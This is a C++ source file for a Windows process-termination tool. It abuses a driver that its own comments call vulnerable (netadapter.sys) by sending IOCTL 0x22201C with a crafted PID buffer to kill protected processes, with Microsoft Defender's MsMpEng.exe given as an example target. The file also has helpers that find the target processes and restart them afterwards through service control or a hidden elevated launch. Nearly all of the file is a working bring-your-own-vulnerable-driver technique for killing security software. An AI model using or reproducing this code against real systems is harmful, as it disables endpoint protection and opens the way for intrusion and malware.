// ProcessKiller.cpp
// Process termination via driver IOCTL and service-based restoration.
// © WESMAR Marek Wesołowski

#include "ProcessKiller.h"
#include "ConfigReader.h"
#include <tlhelp32.h>
#include <algorithm>
#include <winsvc.h>
#include <shellapi.h>
#include <mutex>
#include <set>
#include <map>

// Protects ConfigReader::WriteProcessPath calls inside FindProcesses so that
// parallel refreshes don't race on the registry write.
static std::mutex g_cacheMutex;

// ---------------------------------------------------------------------------
// Batch restore
// ---------------------------------------------------------------------------

// Attempts to start each process in exeNames via SCM or ShellExecute fallback.
// results[i] is set to:
//   0 — failed (process not found as a service and no known executable path)
//   1 — successfully started
//   2 — was already running
//
// Performance note: a naive implementation would open the SCM once per process
// and call EnumServicesStatusEx repeatedly.  This version does a single
// EnumServicesStatusExW to build serviceCache, then matches all pending
// processes against it in one pass — O(N*M) instead of O(N * SCM_overhead).
void ProcessKiller::RestoreProcesses(const std::vector<std::wstring>& exeNames,
                                     std::vector<int>& results) {
    results.assign(exeNames.size(), 0);

    // Step 1: mark processes that are already running so we don't try to start them.
    auto initiallyRunning = FindProcesses(exeNames);
    std::set<std::wstring> runningNames;
    for (const auto& proc : initiallyRunning) {
        std::wstring lowerName = proc.name;
        std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
        runningNames.insert(lowerName);
    }

    for (size_t i = 0; i < exeNames.size(); ++i) {
        std::wstring lowerTarget = exeNames[i];
        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::towlower);
        if (runningNames.contains(lowerTarget)) {
            results[i] = 2; // already running — nothing to do
        }
    }

    // Step 2: enumerate all Win32 services once and build a searchable cache.
    // Each entry holds the service name and the full binary path from its config
    // so we can match "MsMpEng.exe" by substring against the ImagePath.
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr,
                                     SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
    std::vector<ServiceCacheEntry> serviceCache;

    if (hSCM) {
        DWORD bytesNeeded       = 0;
        DWORD servicesReturned  = 0;
        DWORD resumeHandle      = 0;

        // First call with a null buffer to get the required buffer size.
        EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
            nullptr, 0, &bytesNeeded, &servicesReturned, &resumeHandle, nullptr);

        if (GetLastError() == ERROR_MORE_DATA) {
            std::vector<BYTE> buffer(bytesNeeded);
            auto* services = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buffer.data());

            if (EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                buffer.data(), bytesNeeded, &bytesNeeded,
                &servicesReturned, &resumeHandle, nullptr)) {

                for (DWORD i = 0; i < servicesReturned; ++i) {
                    SC_HANDLE hService = OpenServiceW(hSCM, services[i].lpServiceName,
                                                      SERVICE_QUERY_CONFIG);
                    if (hService) {
                        DWORD configBytesNeeded = 0;
                        QueryServiceConfigW(hService, nullptr, 0, &configBytesNeeded);
                        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                            std::vector<BYTE> configBuffer(configBytesNeeded);
                            auto* config = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(configBuffer.data());
                            if (QueryServiceConfigW(hService, config, configBytesNeeded, &configBytesNeeded)) {
                                serviceCache.push_back({ services[i].lpServiceName,
                                                         config->lpBinaryPathName });
                            }
                        }
                        CloseServiceHandle(hService);
                    }
                }
            }
        }

        // Step 3: match each not-yet-resolved target against the service cache
        // by scanning the binary path for the exe filename.
        for (size_t i = 0; i < exeNames.size(); ++i) {
            if (results[i] != 0) continue; // already handled (running or previously started)

            std::wstring lowerTarget = exeNames[i];
            std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::towlower);

            for (const auto& service : serviceCache) {
                std::wstring lowerBinPath = service.binaryPath;
                std::transform(lowerBinPath.begin(), lowerBinPath.end(),
                               lowerBinPath.begin(), ::towlower);

                if (lowerBinPath.find(lowerTarget) != std::wstring::npos) {
                    SC_HANDLE hService = OpenServiceW(hSCM, service.serviceName.c_str(),
                                                      SERVICE_START);
                    if (hService) {
                        // ERROR_SERVICE_ALREADY_RUNNING is a success — the process came
                        // up between our initial check and the StartService call.
                        if (StartServiceW(hService, 0, nullptr) ||
                            GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                            results[i] = 1;
                        }
                        CloseServiceHandle(hService);
                        if (results[i] == 1) break; // stop scanning the cache for this target
                    }
                }
            }
        }
        CloseServiceHandle(hSCM);
    }

    // Step 4: for anything not resolved as a service, try launching the stored
    // executable path directly via ShellExecuteEx with the "runas" verb so that
    // the spawned process inherits an elevated token.
    for (size_t i = 0; i < exeNames.size(); ++i) {
        if (results[i] != 0) continue;

        std::wstring lowerTarget = exeNames[i];
        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::towlower);

        const std::wstring executablePath = ConfigReader::ReadProcessPath(lowerTarget);
        if (!executablePath.empty()) {
            SHELLEXECUTEINFOW sei = { sizeof(sei) };
            sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
            sei.lpVerb = L"runas";
            sei.lpFile = executablePath.c_str();
            sei.nShow  = SW_HIDE;
            if (ShellExecuteExW(&sei)) {
                if (sei.hProcess) CloseHandle(sei.hProcess);
                results[i] = 1;
            }
        }
    }
}

// Convenience wrapper around RestoreProcesses for single-process callers (CLI).
int ProcessKiller::RestoreProcess(const std::wstring& exeName) {
    std::vector<std::wstring> names = { exeName };
    std::vector<int> res;
    RestoreProcesses(names, res);
    return res[0];
}

// ---------------------------------------------------------------------------
// Process enumeration
// ---------------------------------------------------------------------------

// Snapshots all running processes and returns those matching processNames.
// Match is case-insensitive, full exe name comparison (e.g. "msmpeng.exe").
//
// Side effect: for every match, the process's full image path is queried via
// QueryFullProcessImageNameW and written to the config Paths key.  This keeps
// the stored path current after reinstalls or moves, at the cost of one extra
// OpenProcess per found process.  The write is mutex-guarded to avoid racing
// with concurrent ConfigReader calls from other threads.
std::vector<ProcessInfo> ProcessKiller::FindProcesses(const std::vector<std::wstring>& processNames) {
    std::vector<ProcessInfo> found;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return found;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            // Normalise snapshot entry name to lowercase for comparison.
            std::wstring exeName = pe.szExeFile;
            std::transform(exeName.begin(), exeName.end(), exeName.begin(), ::towlower);

            for (const auto& target : processNames) {
                std::wstring targetLower = target;
                std::transform(targetLower.begin(), targetLower.end(),
                               targetLower.begin(), ::towlower);

                if (exeName == targetLower) {
                    ProcessInfo info;
                    info.pid     = pe.th32ProcessID;
                    info.name    = exeName;
                    info.running = true;

                    // Refresh the stored path every time the process is seen running
                    // so paths stay current after reinstalls or moves.
                    {
                        std::lock_guard<std::mutex> lock(g_cacheMutex);
                        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                                   FALSE, pe.th32ProcessID);
                        if (hProc) {
                            wchar_t pathBuf[MAX_PATH];
                            DWORD   size = MAX_PATH;
                            if (QueryFullProcessImageNameW(hProc, 0, pathBuf, &size))
                                ConfigReader::WriteProcessPath(targetLower, pathBuf);
                            CloseHandle(hProc);
                        }
                    }

                    found.push_back(info);
                    break; // one entry per snapshot row is enough
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return found;
}

// ---------------------------------------------------------------------------
// Process liveness check
// ---------------------------------------------------------------------------

// Returns true if the process identified by pid is still alive.
//
// Implementation note: we use SYNCHRONIZE + WaitForSingleObject(0) rather than
// re-snapshotting with TH32CS because:
//   - The toolhelp snapshot can list processes that are in the process of
//     terminating ("zombie" state on Windows) as still alive.
//   - A process object becomes signalled the moment it exits, so a zero-timeout
//     wait is an instantaneous and reliable liveness test.
//
// Access-denied on OpenProcess is treated conservatively as "still running"
// to avoid reporting a false "dead" result for protected system processes.
bool ProcessKiller::IsProcessRunning(DWORD pid) {
    HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, pid);
    if (hProcess == nullptr) {
        // Can't open — either already gone (ERROR_INVALID_PARAMETER) or
        // access denied (ERROR_ACCESS_DENIED).  Treat the latter as alive.
        return GetLastError() == ERROR_ACCESS_DENIED;
    }

    const DWORD waitResult = WaitForSingleObject(hProcess, 0);
    CloseHandle(hProcess);

    // WAIT_OBJECT_0 = process exited (object is signalled).
    // WAIT_TIMEOUT  = process is still running (not yet signalled).
    return waitResult != WAIT_OBJECT_0;
}

// ---------------------------------------------------------------------------
// IOCTL dispatch
// ---------------------------------------------------------------------------

// Sends the kill IOCTL to the loaded kernel driver.
// The 1036-byte input buffer has the target PID in the first 4 bytes; the rest
// is zero-padding required by the vulnerable driver's dispatch routine.
// IOCTL code 0x22201C is the process-termination handler in netadapter.sys.
bool ProcessKiller::SendIOCTL(HANDLE hDriver, DWORD pid) {
    if (hDriver == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Layout: [DWORD pid][1032 bytes padding]
    std::vector<BYTE> buffer(1036, 0);
    *reinterpret_cast<DWORD*>(buffer.data()) = pid;

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(
        hDriver,
        0x22201C,                          // Vulnerable driver IOCTL — process kill
        buffer.data(),
        static_cast<DWORD>(buffer.size()),
        nullptr, 0,                        // No output buffer needed for this IOCTL
        &bytesReturned,
        nullptr
    );

    return result != FALSE;
}

// Thin wrapper so callers don't need to know the IOCTL details.
bool ProcessKiller::KillProcess(HANDLE hDriver, DWORD pid) {
    return SendIOCTL(hDriver, pid);
}

// Returns the embedded default target list (delegating to ConfigReader).
// Used by CLI -list and for first-run seeding of the Targets registry key.
std::vector<std::wstring> ProcessKiller::GetDefaultTargetList() {
    return ConfigReader::ReadSeedProcessList();
}
